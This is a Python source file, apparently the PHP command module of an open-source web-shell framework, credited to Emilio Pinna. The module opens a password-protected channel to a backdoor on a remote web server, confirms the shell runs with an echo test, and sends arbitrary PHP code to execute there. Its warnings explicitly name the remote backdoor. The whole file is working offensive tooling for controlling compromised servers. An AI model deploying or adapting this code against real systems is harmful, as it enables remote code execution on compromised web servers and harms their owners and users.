from mako.template import Template
from core.module import Module, Status
from core import messages
from core import utilities
from core.channels.channel import Channel
from core.loggers import log, dlog
import random


class Php(Module):

    """Execute PHP commands."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
          { 'name' : 'command', 'help' : 'PHP code enclosed with brackets and terminated by semi-comma', 'nargs' : '+' },
          { 'name' : '-prefix-string', 'default' : '' },
          { 'name' : '-post_data' },
          { 'name' : '-postfix-string', 'default' : '' },
        ])

        self.channel = None

    def setup(self, args={}):
        """Instauration of the PHP channel. Returns the module status."""

        self._instantiate_channel()

        rand = str(random.randint(11111, 99999))

        command = 'echo(%s);' % rand
        response, code = self.channel.send(command)

        if rand == response:
            status = Status.RUN
            self.session['channel'] = self.channel.channel_name
        else:
            status = Status.FAIL

        # If the response is wrong, warn about the
        # error code
        self._print_response_status(command, code, response)

        log.debug(
            'PHP shell is %s' % (
                'running' if status == Status.RUN else 'failed'
            )
        )

        return status

    def run(self, args):
        """ Run module """

        self._instantiate_channel()

        cwd = self._get_stored_result('cwd', module = 'file_cd', default = '.')
        chdir = '' if cwd == '.' else "chdir('%s');" % cwd

        # Compose command with cwd, pre_command, and post_command option.
        args.update({ 'chdir' : chdir })
        command = Template("""${chdir}${prefix_string}${ ' '.join(command) }${postfix_string}""").render(**args)

        # Send command
        response, code = self.channel.send(command)

        # If the response is empty, warn about the error code
        self._print_response_status(command, code, response)

        # Strip last newline if present
        return response[:-1] if (
            response and response.endswith('\n')
            ) else response

    def _print_response_status(self, command, code, response):

        """
        Debug print and warning in case of missing response and HTTP errors
        """

#        log.debug(
#           utilities.shorten_string(
#               command,
#               keep_header = 40,
#               keep_trailer = 40
#           )
#        )

        log.debug('PAYLOAD %s' % command)
        log.info('== RESPONSE ==\n%s==== END ====' % response)

        if response: return

        if code == 404:
            log.warn(messages.module_shell_php.error_404_remote_backdoor)
        elif code == 500:
            log.warn(messages.module_shell_php.error_500_executing)
        elif code == -1:
            log.warn(messages.module_shell_php.error_URLError_network)
        elif code != 200:
            log.warn(messages.module_shell_php.error_i_executing % code)

        command_last_chars = utilities.shorten_string(command.rstrip(),
                                                    keep_trailer = 10)

        if (command_last_chars and
              command_last_chars[-1] not in ( ';', '}' )):
            log.warn(messages.module_shell_php.missing_php_trailer_s % command_last_chars)

    def _instantiate_channel(self):
        """The channel presence check and eventual instantation has to be
        done both in setup() than in run(), to have a slack instantiation"""

        if self.channel: return

        self.channel = Channel(
            url = self.session['url'],
            password = self.session['password'],
            channel_name = self.session['channel']
        )
